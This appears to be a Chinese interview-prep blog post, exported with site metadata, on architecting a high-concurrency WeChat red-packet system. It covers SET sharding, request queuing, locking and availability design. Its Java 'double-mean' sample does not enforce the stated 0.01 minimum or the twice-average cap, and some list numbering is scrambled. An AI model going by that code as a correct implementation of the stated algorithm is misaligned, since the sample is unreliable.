业务下面数据存储层，微信红包最主要的数据是订单数据，包括发红包订单和拆红包订单两部分。\n\n\n数据存储层的冷热分离设计：微信红包数据的访问热度，随着时间流逝会急剧降低，也就是数据的访问时间段非常集中，一般红包发出三天后，99% 的用户不会再去点开这个红包了。因此微信红包系统采取按时间做冷热数据分离，降低数据的存储成本，同时提升了热数据的访问性能。\n\n除了在线计算的三层架构，还有离线处理的数据分析。\n\n数据分析平台用于对红包数据的分析计算，比如朋友圈里的文章，统计从 某年 1 月 1 日到 2017 年 1 月一个用户总共抢红包的金额，在全国的排名情况，发红包数最多的城市等。\n\n数据分析平台另外一个作用就是对账，红包的订单和微信支付的订单需要对账，以保证最终资金的一致性；\n\n*   订单的数据和订单的 cache 需要做对账，以保证数据的完整性；\n\n*   订单数据和用户的收发记录需要对账，以保证用户列表完整性。\n\n\n### 高并发常用解决方案\n\n普通商品秒杀系统，解决高并发问题的方案，大致有以下2种：\n\n### 1- 使用内存替代实时的DB\n\n将实时扣库存的行为上移到内存Cache中，内存Cache操作成功直接给Server返回成功，然后异步落DB持久化。\n\n![](./2024/05/28/百亿流量红包系统/8.png)\n这个方案的优缺点如下：\n\n> 优点：用内存操作替代磁盘操作，提高了并发性能。\n>\n> 缺点：在内存操作成功DB持久化失败，或者内存Cache故障的情况下，DB持久化会丢数据，不适合微信红包这种资金交易系统。\n\n### 2- 使用乐观锁替代悲观锁\n\n**什么是悲观锁呢？**\n\n所谓悲观锁，是关系数据库管理系统里的一种并发控制的方法。它可以阻止一个事务以影响其他用户的方式来修改数据。如果一个事务执行的操作对某行数据应用了锁，那只有当这个事务把锁释放，其他事务才能够执行与该锁冲突的操作。对应于上文分析中的“并发请求抢锁”行为。\n\n**什么是乐观锁呢？**\n\n所谓乐观锁，它假设多用户并发的事务在处理时不会彼此互相影响，各事务能够在不产生锁的情况下处理各自影响的那部分数据。在提交数据更新之前，每个事务会先检查在该事务读取数据后，有没有其他事务又修改了该数据。如果其他事务有更新的话，正在提交的事务会进行回滚。\n\n乐观锁分为DB乐观锁和 JVM CAS 乐观锁。\n\nDB乐观锁的具体应用方法，是在 DB 的“库存”记录中维护一个版本号。\n\n商品“秒杀”系统中，在更新“库存”的操作进行前，先去 DB 获取当前版本号。\n\n在更新库存的事务提交时，检查该版本号是否已被其他事务修改。如果版本没被修改，则提交事务，且版本号加 1；如果版本号已经被其他事务修改，则回滚事务，并给上层报错。\n\nDB乐观锁可以提高DB的并发处理能力，但是如果应用于微信红包系统，则会存在下面三个问题：\n\n1.  如果拆红包采用乐观锁，那么在并发抢到相同版本号的拆红包请求中，只有一个能拆红包成功，其他的请求将事务回滚并返回失败，给用户报错，用户体验完全不可接受。\n\n2.  如果采用乐观锁，将会导致第一时间同时拆红包的用户有一部分直接返回失败，反而那些“手慢”的用户，有可能因为并发减小后拆红包成功，这会带来用户体验上的负面影响。\n\n3.  如果采用乐观锁的方式，会带来大数量的无效更新请求、事务回滚，给 DB 造成不必要的额外压力。\n\n\n#### JVM CAS 乐观锁方案\n\n出于性能原因，微信红包系统使用 JVM CAS 乐观锁，而不是DB乐观锁的方式解决并发抢锁问题。\n\n微信红包的金额是在拆红包时实时计算的，而不是预先分配的。系统会在拆红包时取0.01到剩余平均值\\*2之间的数值作为红包金额。\n\n这种实时计算的方式基于JVM 内存进行，不需要额外的存储空间，且计算效率很高。\n\n同时，为了保证操作的原子性，拆包过程中使用了CAS（Compare-and-Swap）算法，确保每次只有一个并发用户拆包成功。如果拆包CAS失败，系统会自动进行重试，但也可能在重试过程中被其他用户抢得先机而空手而归。\n\n如何保证同一个红包由同一个节点去拆包呢？将同一个红包 ID 的所有请求 stick 到同一台 Server，这个后面介绍。\n\n> 以上内容比较复杂，架构团队会录制成为架构视频， 帮助大家做架构拿高薪。\n\n## 微信红包系统的高并发解决方案\n\n综合上面的分析，我们的红包系统针对相应的技术难点，采用如下3个方案，解决高并发问题。\n\n##### 1- 分而治之：系统架构设计垂直Set化。\n\n**什么是Set（单元）化架构呢?**\n\n> 单元化架构是一种将系统划分为多个独立的、自包含的单元的部署架构，每个单元都能够完成所有业务操作，包含所有业务所需的服务以及分配给该单元的数据。这种架构将单元作为部署的基本单位，在全站所有机房中部署多个单元，每个机房内的单元数目不固定，但任一单元均部署系统所需的全部应用。数据则是全量数据按照某种维度划分后的一部分。与传统意义上的SOA（服务化）架构不同，单元化架构下，服务仍然是分层的，但每一层中的任意一个节点都属于且仅属于某一个单元，上层调用下层时，仅会选择本单元内的节点。\n\n**通俗的理解为**：\n\n单元化架构，简单来说，就是把系统拆分成若干个独立的单元，每个单元都包含了完成业务操作所需的所有服务和数据。这些单元可以独立部署、管理和监控，就像一个个小房子，每个房子都有自己的客厅、卧室和厨房（服务），也有自己的食物和水（数据）。\n\n如下图，是一种单元化架构设计。\n\n![](./2024/05/28/百亿流量红包系统/6.png)\n\n微信红包用户发一个红包时，微信红包系统生成一个 ID 作为这个红包的唯一标识。\n\n接下来这个红包的所有发红包、抢红包、拆红包、查询红包详情等操作，都根据这个 ID 关联。\n\n红包系统根据这个红包 ID，按一定的规则（如按 ID 尾号取模等），垂直上下切分。\n\n切分后，一个垂直链条上的逻辑 Server 服务器、DB 统称为一个 SET。\n\n各个 SET 之间相互独立，互相解耦。并且同一个红包 ID 的所有请求，包括发红包、抢红包、拆红包、查详情详情等，垂直 stick 到同一个 SET 内处理，高度内聚。\n\n通过这样的方式，系统将所有红包请求这个巨大的洪流分散为多股小流，互不影响，分而治之，如下图所示。\n\n![](./2024/05/28/百亿流量红包系统/7.png)\n这个方案解决了同时存在海量事务级操作的问题，将**海量化为小量**。\n\n##### 2- 解决DB并发：逻辑Server层将请求排队。\n\n红包系统是资金交易系统，DB 操作的事务性无法避免，所以会存在“并发抢锁”问题。但是如果到达 DB 的事务操作（也即拆红包行为）不是并发的，而是串行的，就不会存在“并发抢锁”的问题了。\n\n按这个思路，为了使拆红包的事务操作串行地进入 DB，只需要将请求在 Server 层以 FIFO（先进先出）的方式排队，就可以达到这个效果。从而问题就集中到 Server 的 FIFO 队列设计上。\n\n红包系统设计了分布式的、轻巧的、灵活的 FIFO 队列方案。其具体实现如下：\n\n**1）将同一个红包 ID 的所有请求 stick 到同一台 Server。**\n\n上面 SET 化方案已经介绍，同个红包 ID 的所有请求，按红包 ID stick 到同个 SET 中。\n\n不过在同个 SET 中，会存在多台 Server 服务器同时连接同一台 DB（基于容灾、性能考虑，需要多台 Server 互备、均衡压力）。\n\n为了使同一个红包 ID 的所有请求，stick 到同一台 Server 服务器上，在 SET 化的设计之外，微信红包系统添加了一层基于红包 ID hash 值的分流，如下图所示。\n\n\n> 以上内容比较复杂，架构团队会录制成为架构视频， 帮助大家做架构拿高薪。\n\n**2）设计单机请求排队方案。**\n\n将 stick 到同一台 Server 上的所有请求在被接收进程接收后，按红包 ID 进行排队。\n\n然后串行地进入 worker 进程（执行业务逻辑）进行处理，从而达到排队的效果，如下图所示。\n\n![](./2024/05/28/百亿流量红包系统/9.png)\n**3）增加 Redis缓存 控制并发。**\n\n为了防止 Server 中的请求队列过载导致队列被降级，从而所有请求拥进 DB，系统增加了与 Server 服务器同机部署的 Redis ，用于控制拆同一个红包的请求并发数。\n\n具体来说，利用 Redis 的 CAS 原子累增操作，控制同时进入 DB 执行拆红包事务的请求数，超过预先设定数值则直接拒绝服务。用于 DB 负载升高时的降级体验。\n\n通过以上三个措施，系统有效地控制了 DB 的“并发抢锁”情况。\n\n##### 3- 系统性能稳定性保障：双维度分库分表设计。\n\n红包系统的分库表规则，初期是根据红包 ID 的 hash 值分为多库多表。\n\n随着红包数据量逐渐增大，单表数据量也逐渐增加。而 DB 的性能与单表数据量有一定相关性。当单表数据量达到一定程度时，DB 性能会有大幅度下降，影响系统性能稳定性。\n\n采用冷热分离，将历史冷数据与当前热数据分开存储，可以解决这个问题。\n\n处理微信红包数据的冷热分离时，系统在以红包 ID 维度分库表的基础上，增加了以循环天分表的维度，形成了双维度分库表的特色。\n\n具体来说，就是分库表规则像 db\\_xx.t\\_y\\_dd 设计，其中，xx/y 是红包 ID 的 hash 值后三位，dd 的取值范围在 01~31，代表一个月天数最多 31 天。\n\n通过这种双维度分库表方式，解决了 DB 单表数据量膨胀导致性能下降的问题，保障了系统性能的稳定性。同时，在热冷分离的问题上，又使得数据搬迁变得简单而优雅。\n\n综上所述，微信红包系统在解决高并发问题上的设计，主要采用了 **SET 化分治**、**请求排队**、**双维度分库表**等方案，使得单组 DB 的并发性能大幅度提升，取得了很好的效果。\n\n#### 红包分配算法\n\n抢红包后，我们需要进行拆红包，接下来我们讨论一下红包系统的红包分配算法。\n\n红包金额分配时，由于是随机分配，所以有两种实现方案：**实时拆分和预先生成**\n\n##### 1- 实时拆分\n\n实时拆分，指的是在**抢红包时实时计算**每个红包的金额，以实现红包的拆分过程。\n\n这个对系统性能和拆分算法要求较高，例如拆分过程要一直保证后续待拆分红包的金额不能为空，不容易做到拆分的红包金额服从**正态分布**规律。\n\n##### 2- 预先生成\n\n预先生成，指的是在红包**开抢之前**已经完成了红包的**金额拆分**，抢红包时只是依次取出拆分好的红包金额。\n\n这种方式对拆分算法要求较低，可以拆分出随机性很好的红包金额，但通常需要结合队列使用。\n\n##### 3- 二倍均值法\n\n综合上述优缺点考虑，以及微信群聊中的人数不多（目前最高 500 人），所以我们采用实时拆分的方式，用**二倍均值法**来生成随机红包，只满足随机即可，不需要正态分布。\n\n```\n\n\n使用二倍均值法生成的随机数，每次随机金额会在  0.01 ~ 剩余平均值\\*2 之间。  \n\n\n\n```\n\n假设当前红包剩余金额为 10 元，剩余个数为 5，**10/5 = 2**，则当前用户可以抢到的红包金额为：**0.01 ~ 4** 元之间。\n\n以下是使用Java实现的二倍均值算法，在红包分配场景中。\n\n```\n\n\npublic class RedPacketDistribution {  \n  \n    public static List<BigDecimal> distribute(BigDecimal totalAmount, int totalCount) {  \n        // 校验总金额是否为正  \n        if (totalAmount.compareTo(BigDecimal.ZERO) <= 0) {  \n            throw new IllegalArgumentException(\"Invalid parameter, totalAmount must be positive.\");  \n        }  \n        // 校验红包总数是否至少为1  \n        if (totalCount < 1) {  \n            throw new IllegalArgumentException(\"Invalid parameter, totalCount must be at least 1.\");  \n        }  \n  \n        List<BigDecimal> redPacketList = new ArrayList<>(totalCount);  \n        BigDecimal remainingAmount = totalAmount.multiply(BigDecimal.valueOf(2)); // 初始化为总金额的两倍  \n        ThreadLocalRandom random = ThreadLocalRandom.current(); // 使用线程安全的随机数生成器  \n  \n        for (int i = 0; i < totalCount - 1; i++) {  \n            // 随机获取一个幸运值，范围在\\[0, 当前剩余金额)  \n            BigDecimal luckValue = BigDecimal.valueOf(random.nextDouble()).multiply(remainingAmount);  \n            // 计算并添加实际分配的红包金额（幸运值的一半）  \n            BigDecimal amount = luckValue.divide(BigDecimal.valueOf(2), BigDecimal.ROUND\\_HALF\\_DOWN);  \n            redPacketList.add(amount);  \n            // 更新剩余金额  \n            remainingAmount = remainingAmount.subtract(luckValue);  \n        }  \n  \n        // 最后一个红包直接拿走剩余的全部金额，确保总和正确  \n        redPacketList.add(remainingAmount.divide(BigDecimal.valueOf(2), BigDecimal.ROUND\\_HALF\\_DOWN));  \n  \n        return redPacketList;  \n    }  \n  \n    public static void main(String\\[\\] args) {  \n        BigDecimal totalAmount = new BigDecimal(\"100.00\"); // 红包总金额  \n        int totalCount = 10;      // 红包个数  \n        List<BigDecimal> redPackets = distribute(totalAmount, totalCount);  \n  \n        System.out.println(\"Red packet distribution:\");  \n        for (BigDecimal amount : redPackets) {  \n            System.out.printf(\"%.2f, \", amount);  \n        }  \n    }  \n}  \n\n\n\n```\n\n> 以上内容比较复杂，架构团队会录制成为架构视频， 帮助大家做架构拿高薪。\n\n## 红包系统高可用架构设计\n\n红包业务量级的高速发展，对后台系统架构的可用性要求越来越高。在保障微信红包业务体验的前提下，红包后台系统进行了一系列高可用方面的优化设计。\n\n要保障红包系统架构的高可用性，可以从多个方面进行优化和设计。以下是一些详细说明：\n\n1.  **系统架构设计**：\n\n\n*   **信息流、业务流、资金流分离**：红包系统由信息流、业务流、资金流三部分组成，这三部分在组织架构上应由不同的后台团队完成，以提高系统的模块化和可维护性。\n\n*   **微服务架构**：采用微服务架构，将红包系统拆分成多个独立的服务，每个服务负责特定的功能，这样可以提高系统的可扩展性和容错性。\n\n*   **无状态设计**：确保红包系统的服务是无状态的，即服务不需要保存用户的会话信息，这样可以提高系统的并发处理能力和可靠性。\n\n\n3.  **高可用性策略**：\n\n\n*   **冗余部署**：将系统的关键组件部署在多台服务器上，通过搭建主备或者集群的架构来实现冗余。当主服务器出现故障时，备用服务器能够自动接管，保证系统的可用性。\n\n*   **负载均衡**：通过将流量分发到多台服务器上，均衡系统的请求负载，提高系统的可用性和扩展性。负载均衡可以通过硬件（如负载均衡器）或者软件（如Nginx、HAProxy）实现。\n\n*   **服务容器化**：使用容器技术（如Docker、Kubernetes）将应用程序与其依赖项打包为容器，实现快速部署、弹性扩展和自动化管理。容器化可以提高系统的可移植性、弹性和可伸缩性，从而增加系统的高可用性。\n\n\n5.  **数据保障**：\n\n\n*   **数据备份与恢复**：定期对关键数据进行备份，并确保备份的数据可用性。这样，在发生数据丢失或损坏时，可以快速恢复数据，减少系统停机时间。\n\n*   **分布式缓存**：使用多级缓存技术（如Redis、Memcached等），将数据分别存储在内存缓存、本地缓存和分布式缓存中，以提高访问速度和降低数据库压力。\n\n*   **数据一致性**：使用分布式锁技术来保护红包的领取操作，确保每个用户只能领取一次红包。同时，为了保证数据一致性，可以采用消息队列等技术实现请求的异步处理和结果的返回。\n\n\n7.  **监控与告警**：\n\n\n*   **系统监控**：对红包系统的关键指标（如请求量、响应时间、错误率等）进行实时监控，以便及时发现和解决潜在问题。\n\n*   **告警机制**：设置合理的告警阈值，当系统出现异常情况时，及时发送告警通知给相关人员，以便快速响应和处理。\n\n\n9.  **安全性保障**：\n\n    通过以上措施的综合应用，可以大大提高红包系统架构的高可用性，确保系统在高峰时段能够稳定、高效地运行。\n\n\n*   **访问控制**：实施严格的访问控制策略，确保只有授权的用户才能访问红包系统。\n\n*   **数据加密**：对敏感数据进行加密存储和传输，以防止数据泄露和篡改。\n\n*   **安全审计**：定期对红包系统进行安全审计和漏洞扫描，及时修复发现的安全漏洞和隐患。\n\n\n#### 1 - 系统可用性影响因素\n\n**系统的可用性影响因素可分成两类：**\n\n*   一类计划外；\n\n    计划外包含很多因素，系统用到的所有东西都可能产生故障，都可能成功影响可用性的因素。从这个角度上来讲，可以说故障是无法避免的，系统的运作一定会产生故障，尤其是服务器有成千上万个的时候。\n\n*   一类计划内。\n\n    计划内的影响因素，主要有与升级相关、运维相关的操作，以及日常的备份等。这一类影响因素，通过精细地设计方案，是可以避免对可用性造成影响的。\n\n\n#### 2 - 红包系统可用性设计方向\n\n基于上面两个分析结论，可以总结出红包系统的可用性的设计方向。\n\n> 1.在不能避免意外故障的情况下，尽可能降低出现意外故障时对可用性的影响。\n>\n> 2.绝大多数计划内的日常维护可以通过方案的设计避免影响可用性，其中平行扩容特指关于存储层的平行扩容。\n\n下面从降低故障影响和微信红包系统的平行扩容两方面进行分析。\n\n首先是降低意外故障的影响，重点讲解订单存储层在订单 DB 故障的情况下如何降低对红包系统可用性的影响。\n\n#### 3 - 业务逻辑层 - 部署方案设计\n\n首先是业务逻辑层的部署方案。业务逻辑层是无状态的，微信红包系统的业务逻辑层，部署在两个城市，即两地部署，每一个城市部署至少三个园区，即三个 IDC。并且每个服务需要保证三个 IDC 的部署均衡。另外，三个 IDC 总服务能力需要冗余三分之一，当一个 IDC 出现故障时，服务能力仍然足够。从而达到 IDC 故障不会对可用性产生影响。\n\n#### 4 - 业务逻辑层 - 异步化设计\n\n如下图所示，微信红包的某些步骤不实时完成也不会影响用户对红包业务可用性的体验。\n\n比如拆红包，正常的业务流程很长，但关键步骤只有订单相关的几步。\n\n至于转零钱、写红包记录等操作不需要实时。\n\n用户抢到红包时，一般不会实时去钱包查看微信零钱，而是在微信群中点开消息查看本次抢到金额和他人抢红包金额。\n\n所以拆红包时只需要从 cache 查询用户是否拆过红包，然后写入拆红包的订单记录，更新发红包订单，其他的操作都可以异步化。\n\n当然，不是每个业务都可以进行异步化设计，需要进行业务分析，判断是否存在非关键步骤之外的事情可以将其异步化，并通过异步对账保证最终一致。\n\n经过上述分析之后，可以采用如下思路与方案：\n\n> 实现思路：\n>\n> 1.最简关键路径：简化发红包、拆红包核心流程路径，重点关注与订单相关流程。\n>\n> 2.快慢分离：将核心流程与其他非关键步骤分离。\n>\n> 方案：\n>\n> 1.写用户记录、零钱入账使用MQ异步执行\n>\n> 2.增加对帐机制保障最终一致。\n\n![](./2024/05/28/百亿流量红包系统/11.png)\n如上图所示，微信红包的某些步骤不实时完成也不会影响用户对红包业务可用性的体验。\n\n比如拆红包，正常的业务流程很长，但关键步骤只有订单相关的几步。\n\n至于转零钱、写红包记录等操作不需要实时。\n\n用户抢到红包时，一般不会实时去钱包查看微信零钱，而是在微信群中点开消息查看本次抢到金额和他人抢红包金额。\n\n所以拆红包时只需要从 cache 查询用户是否拆过红包，然后写入拆红包的订单记录，更新发红包订单，其他的操作都可以异步化。\n\n当然，不是每个业务都可以进行异步化设计，需要进行业务分析，判断是否存在非关键步骤之外的事情可以将其异步化，并通过异步对账保证最终一致。\n\n> 以上内容比较复杂，架构团队会录制成为架构视频， 帮助大家做架构拿高薪。\n\n#### 5 - 订单存储层 - 故障自愈\n\n为解决 DB 间的相互影响，需要将 DB 间相互隔离，订单存储层 SET 化。\n\nSET 化指订单 DB 和订单接入 SERVER 垂直 stick 一起。业务逻辑层访问订单时，根据订单倒数第二、三位数字找到所属订单 SET，一个 SET 的请求不能路由到其他 SET。\n\n通过 SET 化得到的好处是，控制 DB 连接数、隔离故障影响和分流并发。\n\n![](./2024/05/28/百亿流量红包系统/10.png)\n如上图所示，所设尾号 90-99 的 SET 故障时，如果业务逻辑服务后续不再生成属于这个 SET 的订单，那后续的业务就可以逐渐恢复。\n\n也就是在发生故障时，业务逻辑层发布一个版本，屏蔽故障号段的单号生成，就可以恢复业务。\n\n进一步想，除了人为发版本，有没有方法可以让 DB 故障时自动恢复？\n\n在 DB 故障导致业务失败时，业务逻辑层可获取到故障 DB 的号段，在发红包时，将这些故障的号段，换一个可用的号段就可恢复业务。\n\n订单号除了最后三位，前面的部分已能保证该红包唯一性，后面的数字只代表着分库表信息，故障时只需要将最后三位换另外一个 SET 便可自动恢复。\n\n完成这个设计后，即使 DB 出现故障，业务的可用性也不会有影响。\n\n这里还有一点，新的发红包请求可避免 DB 故障的影响，但那些故障之前已发出未被领取的红包，红包消息已发送到微信群，单号已确定，拆红包时还是失败。\n\n对这种情况，由于不会有增量，采用正常的主备切换解决即可。\n\n#### 6 - 订单存储层 - 平行扩容设计\n\n\n红包系统的高可用架构设计，主要包括了部署设计、SET 化设计、异步化设计、DB 故障自愈能力建设、平行扩容设计。\n\n> 以上内容比较复杂，架构团队会录制成为架构视频， 帮助大家做架构拿高薪。\n\n### 总结\n\n红包系统是一个高并发的资金交易系统，最大的技术挑战是保障并发性能与资金安全。\n\n这种全新的技术挑战，传统的“秒杀”系统设计方案已不能完全解决。\n\n在分析了业界“秒杀”系统解决方案的基础上，红包系统采用了 SET 化、请求排队串行化、双维度分库表等设计，形成了独特的高并发、资金安全系统解决方案。\n\n## 说在最后：有问题找老架构取经\n\n超高并发红包架构，一定是一个超级牛掰的简历亮点项目，黄金项目，稍微晚点把全量的架构方案和视频进行发布。\n\n这个项目写入简历，面试的时候如果大家能对答如流，如数家珍，基本上 面试官会被你 震惊到、吸引到。\n\n最终，**让面试官爱到 “不能自已、口水直流”**。offer， 也就来了。\n\n\n\n","slug":"百亿流量红包系统","published":1,"updated":"2024-06-01T04:07:08.899Z","comments":1,"layout":"post","photos":[],"_id":"clylh1ryv002ibsuh3dz0alhj","content":"<h1 id=\"百亿流量红包系统，如何架构？（字节面试真题）\"><a href=\"#百亿流量红包系统，如何架构？（字节面试真题）\" class=\"headerlink\" title=\"百亿流量红包系统，如何架构？（字节面试真题）\"></a>百亿流量红包系统，如何架构？（字节面试真题）</h1><h2 id=\"说在前面\"><a href=\"#说在前面\" class=\"headerlink\" title=\"说在前面\"></a>说在前面</h2><p>在读者交流群(50+)中，最近有小伙伴拿到了一线互联网企业如得物、阿里、滴滴、极兔、有赞、希音、百度、网易、美团的面试资格，遇到很多很重要的架构类&#x2F;设计类的场景题：</p>\n<blockquote>\n<p>1.如何设计百亿流量高并发红包系统 ，请说出你的方案？</p>\n<p>2.听说你会架构设计，请问一下如果让你来设计百亿流量红包系统，说说你的架构设计方案。</p>\n</blockquote>\n<p>最近有小伙伴在面试字节，又遇到了红包架构问题。小伙伴支支吾吾的说了几句，面试挂了。</p>\n<p>所以，给大家做一下系统化、体系化的梳理，使得大家内力猛增，可以充分展示一下大家雄厚的 “技术肌肉”，<strong>让面试官爱到 “不能自已、口水直流”</strong>，然后实现”offer直提”。</p>\n<h2 id=\"本文目录\"><a href=\"#本文目录\" class=\"headerlink\" title=\"本文目录\"></a>本文目录</h2><p><strong>- 说在前面</strong></p>\n<p><strong>- 本文目录</strong></p>\n<p>- 红包架构背景</p>\n<h5 id=\"红包系统和秒杀系统的对比\"><a href=\"#红包系统和秒杀系统的对比\" class=\"headerlink\" title=\"-红包系统和秒杀系统的对比\"></a>-红包系统和秒杀系统的对比</h5><p><strong>- 红包系统功能分析</strong></p>\n<p>- 功能1：包红包</p>\n<p>- 功能2：发红包</p>\n<p>- 功能3：抢红包</p>\n<p>- 功能4：拆红包</p>\n<h5 id=\"微信红包的业务特点\"><a href=\"#微信红包的业务特点\" class=\"headerlink\" title=\"-微信红包的业务特点\"></a>-微信红包的业务特点</h5><h5 id=\"微信红包的技术难点\"><a href=\"#微信红包的技术难点\" class=\"headerlink\" title=\"-微信红包的技术难点\"></a>-微信红包的技术难点</h5><p>- 红包系统概要设计</p>\n<h5 id=\"系统功能说明\"><a href=\"#系统功能说明\" class=\"headerlink\" title=\"-系统功能说明\"></a>-系统功能说明</h5><p><strong>- 数据库设计</strong></p>\n<h5 id=\"发红包\"><a href=\"#发红包\" class=\"headerlink\" title=\"-发红包\"></a>-发红包</h5><h5 id=\"抢红包\"><a href=\"#抢红包\" class=\"headerlink\" title=\"-抢红包\"></a>-抢红包</h5><p><strong>- 红包系统详细设计</strong></p>\n<p>- 红包整体架构</p>\n<p>- 高并发常用解决方案</p>\n<p>- 1- 使用内存替代实时的DB</p>\n<p>- 2- 使用乐观锁替代悲观锁</p>\n<h5 id=\"JVM-CAS-乐观锁方案\"><a href=\"#JVM-CAS-乐观锁方案\" class=\"headerlink\" title=\"-JVM CAS 乐观锁方案\"></a>-JVM CAS 乐观锁方案</h5><p><strong>- 微信红包系统的高并发解决方案</strong></p>\n<h5 id=\"1-分而治之：系统架构设计垂直Set化。\"><a href=\"#1-分而治之：系统架构设计垂直Set化。\" class=\"headerlink\" title=\"-1- 分而治之：系统架构设计垂直Set化。\"></a>-1- 分而治之：系统架构设计垂直Set化。</h5><h5 id=\"2-解决DB并发：逻辑Server层将请求排队。\"><a href=\"#2-解决DB并发：逻辑Server层将请求排队。\" class=\"headerlink\" title=\"-2- 解决DB并发：逻辑Server层将请求排队。\"></a>-2- 解决DB并发：逻辑Server层将请求排队。</h5><h5 id=\"3-系统性能稳定性保障：双维度分库分表设计。\"><a href=\"#3-系统性能稳定性保障：双维度分库分表设计。\" class=\"headerlink\" title=\"-3- 系统性能稳定性保障：双维度分库分表设计。\"></a>-3- 系统性能稳定性保障：双维度分库分表设计。</h5><h5 id=\"红包分配算法\"><a href=\"#红包分配算法\" class=\"headerlink\" title=\"- 红包分配算法\"></a>- 红包分配算法</h5><h5 id=\"1-实时拆分\"><a href=\"#1-实时拆分\" class=\"headerlink\" title=\"-1- 实时拆分\"></a>-1- 实时拆分</h5><h5 id=\"2-预先生成\"><a href=\"#2-预先生成\" class=\"headerlink\" title=\"-2- 预先生成\"></a>-2- 预先生成</h5><h5 id=\"3-二倍均值法\"><a href=\"#3-二倍均值法\" class=\"headerlink\" title=\"-3- 二倍均值法\"></a>-3- 二倍均值法</h5><p><strong>- 红包系统高可用架构设计</strong></p>\n<h5 id=\"1-系统可用性影响因素\"><a href=\"#1-系统可用性影响因素\" class=\"headerlink\" title=\"-1 - 系统可用性影响因素\"></a>-1 - 系统可用性影响因素</h5><h5 id=\"2-红包系统可用性设计方向\"><a href=\"#2-红包系统可用性设计方向\" class=\"headerlink\" title=\"-2 - 红包系统可用性设计方向\"></a>-2 - 红包系统可用性设计方向</h5><h5 id=\"3-业务逻辑层-部署方案设计\"><a href=\"#3-业务逻辑层-部署方案设计\" class=\"headerlink\" title=\"-3 - 业务逻辑层 - 部署方案设计\"></a>-3 - 业务逻辑层 - 部署方案设计</h5><h5 id=\"4-业务逻辑层-异步化设计\"><a href=\"#4-业务逻辑层-异步化设计\" class=\"headerlink\" title=\"-4 - 业务逻辑层 - 异步化设计\"></a>-4 - 业务逻辑层 - 异步化设计</h5><h5 id=\"5-订单存储层-故障自愈\"><a href=\"#5-订单存储层-故障自愈\" class=\"headerlink\" title=\"-5 - 订单存储层 - 故障自愈\"></a>-5 - 订单存储层 - 故障自愈</h5><h5 id=\"6-订单存储层-平行扩容设计\"><a href=\"#6-订单存储层-平行扩容设计\" class=\"headerlink\" title=\"-6 - 订单存储层 - 平行扩容设计\"></a>-6 - 订单存储层 - 平行扩容设计</h5><p>- 总结</p>\n<h3 id=\"红包架构背景\"><a href=\"#红包架构背景\" class=\"headerlink\" title=\"红包架构背景\"></a>红包架构背景</h3><p>红包是一种 瞬时流量很大的应用， 会在很短的时间内，产生巨大的瞬时流量，</p>\n<p>所以，作为架构师来说，这种场景有很大的架构挑战</p>\n<p>以2017年除夕为例，微信红包峰值QPS在76w左右，除夕当天收发微信红包的数量为142亿个。</p>\n<p>这种百亿级别的数据量、100Wqps级别的超高并发，而且整个系统核心功能和支付相关，需要做好高并发、高可用、高可靠。</p>\n<blockquote>\n<p>特别说明：红包架构也是高端面试的核心场景题, 后面也会以视频的形式，对这些架构的一系列的架构场景题目，做系统化的介绍。</p>\n<p>架构团队会录制成为架构视频， 帮助大家做架构拿高薪。</p>\n</blockquote>\n<h4 id=\"红包系统和秒杀系统的对比-1\"><a href=\"#红包系统和秒杀系统的对比-1\" class=\"headerlink\" title=\"红包系统和秒杀系统的对比\"></a>红包系统和秒杀系统的对比</h4><p>我们先了解下微信红包支付的流程。</p>\n<p><img src=\"/./2024/05/28/%E7%99%BE%E4%BA%BF%E6%B5%81%E9%87%8F%E7%BA%A2%E5%8C%85%E7%B3%BB%E7%BB%9F/1.png\"><br>在上面的红包流程中，核心业务包含包红包、发红包、抢红包、拆红包</p>\n<p><img src=\"/./2024/05/28/%E7%99%BE%E4%BA%BF%E6%B5%81%E9%87%8F%E7%BA%A2%E5%8C%85%E7%B3%BB%E7%BB%9F/2.png\"><br>其中最关键的步骤是</p>\n<ul>\n<li><p>发红包</p>\n</li>\n<li><p>抢红包。</p>\n</li>\n</ul>\n<p>在整个体系中，红包系统 是 支付系统的商户，红包这个商户出售的是钱。</p>\n<p>所以，用户发红包在红包系统 使用微信支付购买一份 红包商品，红包系统 将钱发放到相对应的微信群，供参与者领取。</p>\n<p>微信群里的用户抢红包，得到的是商品里边的 零钱。</p>\n<p>在整个体系中，红包系统 和支付系统 之间的关系是商家和第三方支付平台的关系。</p>\n<p>红包的流程，很类似 商品“秒杀”活动。</p>\n<ul>\n<li><p>包红包类似秒杀商品管理</p>\n</li>\n<li><p>发红包类似“秒杀”活动的商品上架；</p>\n</li>\n<li><p>抢红包等同于“秒杀”活动中的查询库存；</p>\n</li>\n<li><p>拆红包对应“秒杀”活动中用户的“秒杀”动作。</p>\n</li>\n</ul>\n<p>不过除了上面的相同点之外，红包业务 与 “秒杀”活动相比，还具备自身的特点：</p>\n<p>首先，抢红包 比 “秒杀”有更海量的并发要求。假设同一时间有 10 万个群里的用户同时在发红包，那就相当于同一时间有 10 万个“秒杀”活动发布出去。10 万个微信群里的用户同时抢红包，将产生海量的并发请求。</p>\n<p>其次，微信红包业务要求更严格的安全级别。红包业务本质上是资金交易。资金交易业务比普通商品“秒杀”活动有更高的安全级别要求。</p>\n<ul>\n<li><p><strong>“秒杀”时可以允许存在“超卖”（即实际被抢的商品数量比计划的库存多）、“少卖”（即实际被抢的商户数量比计划的库存少）的情况。</strong></p>\n</li>\n<li><p><strong>但是对于 红包，不允许存在“超卖”、“少卖”。</strong></p>\n</li>\n</ul>\n<blockquote>\n<p>特别说明：红包架构也是高端面试的核心场景题, 后面也会以视频的形式，对这些架构的一系列的架构场景题目，做系统化的介绍。</p>\n<p>架构团队会录制成为架构视频， 帮助大家做架构拿高薪。</p>\n</blockquote>\n<h2 id=\"红包系统功能分析\"><a href=\"#红包系统功能分析\" class=\"headerlink\" 